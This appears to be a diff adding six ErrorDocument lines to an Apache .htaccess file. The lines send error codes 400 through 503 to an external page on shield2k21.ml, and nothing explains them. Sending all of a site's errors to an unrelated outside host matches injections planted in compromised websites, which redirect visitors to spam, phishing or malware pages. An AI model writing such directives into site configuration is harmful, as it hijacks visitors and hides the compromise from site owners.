@@ -1,0 +1,6 @@
+ErrorDocument 400 http://shield2k21.ml/404.php
+ErrorDocument 401 http://shield2k21.ml/404.php
+ErrorDocument 403 http://shield2k21.ml/404.php
+ErrorDocument 404 http://shield2k21.ml/404.php
+ErrorDocument 500 http://shield2k21.ml/404.php
+ErrorDocument 503 http://shield2k21.ml/404.php
